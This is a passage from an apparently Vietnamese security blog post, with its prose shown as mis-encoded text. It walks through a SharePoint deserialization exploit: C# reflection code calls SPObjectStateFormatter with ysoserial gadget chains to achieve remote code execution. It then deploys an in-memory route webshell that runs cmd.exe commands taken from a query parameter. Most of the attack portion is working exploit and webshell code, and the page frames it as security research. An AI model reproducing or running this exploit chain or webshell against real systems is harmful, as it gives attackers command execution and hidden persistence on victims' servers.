</span></span><span class=line><span class=cl>        <span class=n>info</span><span class=o>.</span><span class=n>AddValue</span><span class=p>(</span><span class=s2>&#34;DataSet.ExtendedProperties&#34;</span><span class=p>,</span> <span class=n>null</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=n>info</span><span class=o>.</span><span class=n>AddValue</span><span class=p>(</span><span class=s2>&#34;DataSet.Tables.Count&#34;</span><span class=p>,</span> <span class=mi>1</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=n>info</span><span class=o>.</span><span class=n>AddValue</span><span class=p>(</span><span class=s2>&#34;DataSet.Tables_0&#34;</span><span class=p>,</span> <span class=n>this</span><span class=o>.</span><span class=n>_fakeTable</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>public</span> <span class=n>void</span> <span class=n>SetFakeTable</span><span class=p>(</span><span class=n>byte</span><span class=p>[]</span> <span class=n>bfPayload</span><span class=p>)</span> <span class=o>=&gt;</span> <span class=n>this</span><span class=o>.</span><span class=n>_fakeTable</span> <span class=o>=</span> <span class=n>bfPayload</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>public</span> <span class=n>DataSetMarshalMod</span><span class=p>(</span><span class=n>byte</span><span class=p>[]</span> <span class=n>bfPayload</span><span class=p>)</span> <span class=o>=&gt;</span> <span class=n>this</span><span class=o>.</span><span class=n>SetFakeTable</span><span class=p>(</span><span class=n>bfPayload</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></td></tr></table></div></div><p>Äoáº¡n code xá»­ lÃ½ thÃ¬ dÃ¹ng reflection Ä‘á»ƒ call Ä‘Æ°á»£c SPObjectStateFormatter.Serialize(), lÆ°u Ã½ lÃ  cáº§n sá»­ dá»¥ng dll cá»§a Sharepoint:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-gdscript3 data-lang=gdscript3><span class=line><span class=cl><span class=k>static</span> <span class=n>void</span> <span class=n>Main</span><span class=p>(</span><span class=n>string</span><span class=p>[]</span> <span class=n>args</span><span class=p>){</span>
</span></span><span class=line><span class=cl>    <span class=k>var</span> <span class=n>spformatter</span> <span class=o>=</span> <span class=n>Activator</span><span class=o>.</span><span class=n>CreateInstance</span><span class=p>(</span><span class=s2>&#34;Microsoft.SharePoint&#34;</span><span class=p>)</span><span class=o>.</span><span class=n>Unwrap</span><span class=p>();</span>
</span></span><span class=line><span class=cl>    <span class=n>MethodInfo</span> <span class=n>SPSerializer</span> <span class=o>=</span> <span class=n>spformatter</span><span class=o>.</span><span class=n>GetType</span><span class=p>()</span><span class=o>.</span><span class=n>GetMethod</span><span class=p>(</span><span class=s2>&#34;Serialize&#34;</span><span class=p>,</span> <span class=n>new</span> <span class=n>Type</span><span class=p>[]</span> <span class=p>{</span> <span class=nb>typeof</span><span class=p>(</span><span class=n>object</span><span class=p>)</span> <span class=p>});</span>
</span></span><span class=line><span class=cl>    <span class=k>var</span> <span class=n>psi</span> <span class=o>=</span> <span class=n>new</span> <span class=n>ProcessStartInfo</span><span class=p>(</span><span class=err>@</span><span class=s2>&#34;ysoserial.exe&#34;</span><span class=p>,</span> <span class=err>@</span><span class=s2>&#34;-g TypeConfuseDelegate -f BinaryFormatter -o base64 -c &#34;&#34;echo SUCCESS &gt; C:\Users\Public\pwn.txt&#34;&#34;&#34;</span><span class=p>){</span>
</span></span><span class=line><span class=cl>       <span class=n>RedirectStandardOutput</span> <span class=o>=</span> <span class=bp>true</span><span class=p>,</span>
</span></span><span class=line><span class=cl>       <span class=n>UseShellExecute</span> <span class=o>=</span> <span class=bp>false</span><span class=p>,</span>
</span></span><span class=line><span class=cl>       <span class=n>CreateNoWindow</span> <span class=o>=</span> <span class=bp>true</span>
</span></span><span class=line><span class=cl>    <span class=p>};</span>
</span></span><span class=line><span class=cl>    <span class=k>var</span> <span class=n>p</span> <span class=o>=</span> <span class=n>Process</span><span class=o>.</span><span class=n>Start</span><span class=p>(</span><span class=n>psi</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=n>string</span> <span class=n>payload</span> <span class=o>=</span> <span class=n>p</span><span class=o>.</span><span class=n>StandardOutput</span><span class=o>.</span><span class=n>ReadToEnd</span><span class=p>()</span><span class=o>.</span><span class=n>Trim</span><span class=p>();</span>
</span></span><span class=line><span class=cl>    <span class=n>p</span><span class=o>.</span><span class=n>WaitForExit</span><span class=p>();</span>
</span></span><span class=line><span class=cl>    <span class=n>byte</span><span class=p>[]</span> <span class=n>bytes</span> <span class=o>=</span> <span class=n>Convert</span><span class=o>.</span><span class=n>FromBase64String</span><span class=p>(</span><span class=n>payload</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=n>DataSetMarshalMod</span> <span class=n>marshal</span> <span class=o>=</span> <span class=n>new</span> <span class=n>DataSetMarshalMod</span><span class=p>(</span><span class=n>bytes</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=n>ArrayList</span> <span class=n>myAl</span> <span class=o>=</span> <span class=n>new</span> <span class=n>ArrayList</span><span class=p>();</span>
</span></span><span class=line><span class=cl>    <span class=n>myAl</span><span class=o>.</span><span class=n>Add</span><span class=p>(</span><span class=n>marshal</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=n>object</span><span class=p>[]</span> <span class=n>parametersArray</span> <span class=o>=</span> <span class=n>new</span> <span class=n>object</span><span class=p>[]</span> <span class=p>{</span> <span class=n>myAl</span> <span class=p>};</span>
</span></span><span class=line><span class=cl>    <span class=n>string</span> <span class=n>result</span> <span class=o>=</span> <span class=p>(</span><span class=n>string</span><span class=p>)</span><span class=n>SPSerializer</span><span class=o>.</span><span class=n>Invoke</span><span class=p>(</span><span class=n>spformatter</span><span class=p>,</span> <span class=n>parametersArray</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=n>Console</span><span class=o>.</span><span class=n>WriteLine</span><span class=p>(</span><span class=n>result</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></td></tr></table></div></div><p>Tá»•ng há»£p láº¡i, request khai thÃ¡c cuá»‘i cÃ¹ng sáº½ nhÆ° nÃ y:<br><img src=https://hackmd.io/_uploads/r1kvMokSWe.png loading=lazy alt=image><br>Máº·c dÃ¹ tráº£ vá» 401 nhÆ°ng chá»©c nÄƒng nÃ y Ä‘Ã£ Ä‘Æ°á»£c thá»±c thi (Sharepoint cÃ³ nhiá»u Ä‘oáº¡n return 401 quÃ¡ vÃ  mÃ¬nh cÅ©ng lÆ°á»i trace). Má»Ÿ mÃ¡y cháº¡y sharepoint lÃªn lÃ  ta tháº¥y ngay file pwn.txt:<br><img src=https://hackmd.io/_uploads/ryaKMj1S-l.png loading=lazy alt=image><br></p><h2 id=iii-deploy-memory-webshell>III. Deploy Memory Webshell</h2><p>MÃ¬nh chá»n route memory webshell Ä‘á»ƒ inject vÃ¬ nÃ³ cÃ³ thá»ƒ inject vÃ o cáº£ WebMVC vÃ  WebForms, cÅ©ng nhÆ° khÃ¡ dá»… code. Äá»ƒ hiá»ƒu rÃµ hÆ¡n vá» Route Memory Webshell hoáº¡t Ä‘á»™ng nhÆ° tháº¿ nÃ o thÃ¬ cÃ³ thá»ƒ ngÃ³ qua <a class=link href=https://kev1n1203.github.io/p/memshell-dotnet target=_blank rel=noopener>Memshell in dotnet</a> cá»§a mÃ¬nh.<br>Táº¡i Ä‘Ã¢y mÃ¬nh dÃ¹ng gadgetchain ActivitySurrogateSelector Ä‘á»ƒ load code C#, gadgetchain nÃ y trong tool yso máº·c Ä‘á»‹nh sáº½ láº¥y binary tá»« file E.cs Ä‘á»ƒ load nhÆ°ng mÃ¬nh test thÃ¬ tháº¥y khÃ¡ nháº¥p nhÃ¡y nÃªn mÃ¬nh Ä‘Ã£ chá»n compile file nÃ y thÃ nh dll rá»“i load (works everytime).<br>VÃ¬ chain nÃ y náº¿u nhÆ° vá»›i ver dotNet > 4.7 thÃ¬ cáº§n pháº£i disable type check, nÃªn mÃ¬nh Ä‘i check ver dotnet cá»§a Sharepoint:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>PS C:\Users\sp_farmadmin&gt; Set-Location &#39;HKLM:\SOFTWARE\Microsoft\NET Framework Setup\NDP\v4\Client&#39;
</span></span><span class=line><span class=cl>PS HKLM:\SOFTWARE\Microsoft\NET Framework Setup\NDP\v4\Client&gt; Get-ItemProperty -Path . | Select-Object Version
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Version
</span></span><span class=line><span class=cl>-------
</span></span><span class=line><span class=cl>4.5.51641
</span></span></code></pre></td></tr></table></div></div><p>Ngon luÃ´n, thá»­ test deser load C# code trÆ°á»›c nÃ o.<br>File E.cs mÃ¬nh sá»­a tÃ­ tá»« file máº·c Ä‘á»‹nh thÃ´i:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span><span class=lnt>7
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>class E {
</span></span><span class=line><span class=cl>    public E(){
</span></span><span class=line><span class=cl>        HttpContext.Current.Response.AddHeader(&#34;kev1n-header-custom&#34;, &#34;muhehehehe&#34;);
</span></span><span class=line><span class=cl>        HttpContext.Current.Response.Cookies.Add(new HttpCookie(&#34;skibidi&#34;, &#34;dopdopyesyes&#34;));
</span></span><span class=line><span class=cl>        HttpContext.Current.Response.End();
</span></span><span class=line><span class=cl>    }
</span></span><span class=line><span class=cl>}
</span></span></code></pre></td></tr></table></div></div><p>Sá»­a láº¡i script exploit pháº§n call nhÆ° sau:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-gdscript3 data-lang=gdscript3><span class=line><span class=cl><span class=k>static</span> <span class=n>void</span> <span class=n>Main</span><span class=p>(</span><span class=n>string</span><span class=p>[]</span> <span class=n>args</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=k>var</span> <span class=n>spformatter</span> <span class=o>=</span> <span class=n>Activator</span><span class=o>.</span><span class=n>CreateInstance</span><span class=p>(</span><span class=s2>&#34;Microsoft.SharePoint, Version=15.0.0.0, Culture=neutral, PublicKeyToken=71e9bce111e9429c&#34;</span><span class=p>,</span> <span class=s2>&#34;Microsoft.SharePoint.WebPartPages.SPObjectStateFormatter&#34;</span><span class=p>)</span><span class=o>.</span><span class=n>Unwrap</span><span class=p>();</span>
</span></span><span class=line><span class=cl>    <span class=n>MethodInfo</span> <span class=n>SPSerializer</span> <span class=o>=</span> <span class=n>spformatter</span><span class=o>.</span><span class=n>GetType</span><span class=p>()</span><span class=o>.</span><span class=n>GetMethod</span><span class=p>(</span><span class=s2>&#34;Serialize&#34;</span><span class=p>,</span> <span class=n>new</span> <span class=n>Type</span><span class=p>[]</span> <span class=p>{</span> <span class=nb>typeof</span><span class=p>(</span><span class=n>object</span><span class=p>)</span> <span class=p>});</span>
</span></span><span class=line><span class=cl>    <span class=n>Process</span><span class=o>.</span><span class=n>Start</span><span class=p>(</span><span class=err>@</span><span class=s2>&#34;C:\Windows\Microsoft.NET\Framework64</span><span class=se>\v</span><span class=s2>4.0.30319\csc.exe&#34;</span><span class=p>,</span> <span class=err>@</span><span class=s2>&#34;/target:library /out:ysoserial-net\E.dll ysoserial-net\E.cs&#34;</span><span class=p>)</span><span class=err>?</span><span class=o>.</span><span class=n>WaitForExit</span><span class=p>();</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>var</span> <span class=n>psi</span> <span class=o>=</span> <span class=n>new</span> <span class=n>ProcessStartInfo</span><span class=p>(</span><span class=err>@</span><span class=s2>&#34;ysoserial.exe&#34;</span><span class=p>,</span> <span class=err>@</span><span class=s2>&#34;-f BinaryFormatter -g ActivitySurrogateSelector -c &#34;&#34;1337&#34;&#34;&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=n>RedirectStandardOutput</span> <span class=o>=</span> <span class=bp>true</span><span class=p>,</span>
</span></span><span class=line><span class=cl>        <span class=n>UseShellExecute</span> <span class=o>=</span> <span class=bp>false</span><span class=p>,</span>
</span></span><span class=line><span class=cl>        <span class=n>CreateNoWindow</span> <span class=o>=</span> <span class=bp>true</span>
</span></span><span class=line><span class=cl>    <span class=p>};</span>
</span></span><span class=line><span class=cl>    <span class=k>var</span> <span class=n>p</span> <span class=o>=</span> <span class=n>Process</span><span class=o>.</span><span class=n>Start</span><span class=p>(</span><span class=n>psi</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=n>string</span> <span class=n>payload</span> <span class=o>=</span> <span class=n>p</span><span class=o>.</span><span class=n>StandardOutput</span><span class=o>.</span><span class=n>ReadToEnd</span><span class=p>()</span><span class=o>.</span><span class=n>Trim</span><span class=p>();</span>
</span></span><span class=line><span class=cl>    <span class=n>p</span><span class=o>.</span><span class=n>WaitForExit</span><span class=p>();</span>
</span></span><span class=line><span class=cl>    <span class=o>//</span><span class=n>Console</span><span class=o>.</span><span class=n>WriteLine</span><span class=p>(</span><span class=n>payload</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=n>byte</span><span class=p>[]</span> <span class=n>bytes</span> <span class=o>=</span> <span class=n>Convert</span><span class=o>.</span><span class=n>FromBase64String</span><span class=p>(</span><span class=n>payload</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=n>DataSetMarshalMod</span> <span class=n>marshal</span> <span class=o>=</span> <span class=n>new</span> <span class=n>DataSetMarshalMod</span><span class=p>(</span><span class=n>bytes</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>ArrayList</span> <span class=n>myAl</span> <span class=o>=</span> <span class=n>new</span> <span class=n>ArrayList</span><span class=p>();</span>
</span></span><span class=line><span class=cl>    <span class=n>myAl</span><span class=o>.</span><span class=n>Add</span><span class=p>(</span><span class=n>marshal</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=n>object</span><span class=p>[]</span> <span class=n>parametersArray</span> <span class=o>=</span> <span class=n>new</span> <span class=n>object</span><span class=p>[]</span> <span class=p>{</span> <span class=n>myAl</span> <span class=p>};</span>
</span></span><span class=line><span class=cl>    <span class=n>string</span> <span class=n>result</span> <span class=o>=</span> <span class=p>(</span><span class=n>string</span><span class=p>)</span><span class=n>SPSerializer</span><span class=o>.</span><span class=n>Invoke</span><span class=p>(</span><span class=n>spformatter</span><span class=p>,</span> <span class=n>parametersArray</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=ne>File</span><span class=o>.</span><span class=n>WriteAllText</span><span class=p>(</span><span class=s2>&#34;objstate.txt&#34;</span><span class=p>,</span> <span class=n>result</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=n>Console</span><span class=o>.</span><span class=n>WriteLine</span><span class=p>(</span><span class=n>result</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></td></tr></table></div></div><p>Gen thÃ nh payload vÃ  send request, response cÃ³ chá»©a cookie vÃ  header mÃ¬nh set:<br><img src=https://hackmd.io/_uploads/SyS7Lj1B-e.png loading=lazy alt=image><br>Sá»­a code file E.cs thÃ nh code deploy memshell:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span><span class=lnt>35
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>class E {
</span></span><span class=line><span class=cl>    public class MyRouteBase : RouteBase
</span></span><span class=line><span class=cl>    {
</span></span><span class=line><span class=cl>        public override RouteData GetRouteData(HttpContextBase httpContext)
</span></span><span class=line><span class=cl>        {
</span></span><span class=line><span class=cl>            String cmd = httpContext.Request.QueryString[&#34;command&#34;]; 
</span></span><span class=line><span class=cl>            if (cmd != null)
</span></span><span class=line><span class=cl>            {
</span></span><span class=line><span class=cl>                HttpResponseBase response = httpContext.Response;
</span></span><span class=line><span class=cl>                Process p = new Process();
</span></span><span class=line><span class=cl>                p.StartInfo.FileName = &#34;cmd.exe&#34;;
</span></span><span class=line><span class=cl>                p.StartInfo.Arguments = &#34;/c&#34; + cmd;
</span></span><span class=line><span class=cl>                p.StartInfo.UseShellExecute = false;
</span></span><span class=line><span class=cl>                p.StartInfo.RedirectStandardOutput = true;
</span></span><span class=line><span class=cl>                p.StartInfo.RedirectStandardError = true;
</span></span><span class=line><span class=cl>                p.Start();
</span></span><span class=line><span class=cl>                byte[] data = Encoding.UTF8.GetBytes(p.StandardOutput.ReadToEnd() + p.StandardError.ReadToEnd());
</span></span><span class=line><span class=cl>                response.Write(System.Text.Encoding.Default.GetString(data));
</span></span><span class=line><span class=cl>            }
</span></span><span class=line><span class=cl>            return null;
</span></span><span class=line><span class=cl>        }
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        public override VirtualPathData GetVirtualPath(RequestContext requestContext, RouteValueDictionary values)
</span></span><span class=line><span class=cl>        {
</span></span><span class=line><span class=cl>            return null;
</span></span><span class=line><span class=cl>        }
</span></span><span class=line><span class=cl>    }
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    public E(){
</span></span><span class=line><span class=cl>        RouteCollection routeCollection = RouteTable.Routes;
</span></span><span class=line><span class=cl>        routeCollection.Insert(0, new MyRouteBase());
</span></span><span class=line><span class=cl>        HttpContext.Current.Response.AddHeader(&#34;Custom-Header&#34;, &#34;Route Memshell Injected!!!!!!!!&#34;);
</span></span><span class=line><span class=cl>        HttpContext.Current.Response.End();
</span></span><span class=line><span class=cl>    }
</span></span><span class=line><span class=cl>}
</span></span></code></pre></td></tr></table></div></div><p>Xuáº¥t hiá»‡n header Custom-Header trong response, chá»©ng tá» C# code Ä‘Ã£ Ä‘Æ°á»£c load:<br><img src=https://hackmd.io/_uploads/HJytUs1HZl.png loading=lazy alt=image><br>RCE thÃ´i:<br><img src=https://hackmd.io/_uploads/HynF8oyBZl.png loading=lazy alt=image><br></p></section><footer class=article-footer><section class=article-tags><a href=/tags/dotnet/>DotNet</a></section><section class=article-copyright><svg class="icon icon-tabler icon-tabler-copyright" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="12" cy="12" r="9"/><path d="M14.5 9a3.5 4 0 100 6"/></svg>
<span>Licensed under CC BY-NC-SA 4.0</span></section></footer></article><div class=disqus-container><div id=disqus_thread></div><script>window.disqus_config=function(){},function(){if(["localhost","127.0.0.1"].indexOf(window.location.hostname)!=-1){document.getElementById("disqus_thread").innerHTML="Disqus comments not available by default when the website is previewed locally.";return}var t=document,e=t.createElement("script");e.async=!0,e.src="//hugo-theme-stack.disqus.com/embed.js",e.setAttribute("data-timestamp",+new Date),(t.head||t.body).appendChild(e)}()</script><noscript>Please enable JavaScript to view the <a href=https://disqus.com/?ref_noscript>comments powered by Disqus.</a></noscript><a href=https://disqus.com class=dsq-brlink>comments powered by <span class=logo-disqus>Disqus</span></a></div><style>.disqus-container{background-color:var(--card-background);border-radius:var(--card-border-radius);box-shadow:var(--shadow-l1);padding:var(--card-padding)}</style><script>window.addEventListener("onColorSchemeChange",e=>{typeof DISQUS=="object"&&DISQUS.reset({reload:!0})})</script><footer class=site-footer><section class=copyright>&copy;
2020 -
2026 kev1n's Blog</section><section class=powerby>Built with <a href=https://gohugo.io/ target=_blank rel=noopener>Hugo</a><br>Theme <b><a href=https://github.com/CaiJimmy/hugo-theme-stack target=_blank rel=noopener data-version=3.33.0>Stack</a></b> designed by <a href=https://jimmycai.com target=_blank rel=noopener>Jimmy</a></section></footer><div class=pswp tabindex=-1 role=dialog aria-hidden=true><div class=pswp__bg></div><div class=pswp__scroll-wrap><div class=pswp__container><div class=pswp__item></div><div class=pswp__item></div><div class=pswp__item></div></div><div class="pswp__ui pswp__ui--hidden"><div class=pswp__top-bar><div class=pswp__counter></div><button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
<button class="pswp__button pswp__button--share" title=Share></button>
<button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
<button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button><div class=pswp__preloader><div class=pswp__preloader__icn><div class=pswp__preloader__cut><div class=pswp__preloader__donut></div></div></div></div></div><div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap"><div class=pswp__share-tooltip></div></div><button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
</button>
<button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)"></button><div class=pswp__caption><div class=pswp__caption__center></div></div></div></div></div><script src=https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js integrity="sha256-ePwmChbbvXbsO02lbM3HoHbSHTHFAeChekF1xKJdleo=" crossorigin=anonymous defer></script><script src=https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js integrity="sha256-UKkzOn/w1mBxRmLLGrSeyB4e1xbrp4xylgAWb3M42pU=" crossorigin=anonymous defer></script><link rel=stylesheet href=https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.min.css crossorigin=anonymous><link rel=stylesheet href=https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.css crossorigin=anonymous></main></div><script src=https://cdn.jsdelivr.net/npm/node-vibrant@3.1.6/dist/vibrant.min.js integrity="sha256-awcR2jno4kI5X0zL8ex0vi2z+KMkF24hUW8WePSA9HM=" crossorigin=anonymous></script><script type=text/javascript src=/ts/main.c922af694cc257bf1ecc41c0dd7b0430f9114ec280ccf67cd2c6ad55f5316c4e.js defer></script><script>(function(){const e=document.createElement("link");e.href="https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&display=swap",e.type="text/css",e.rel="stylesheet",document.head.appendChild(e)})()</script></body></html>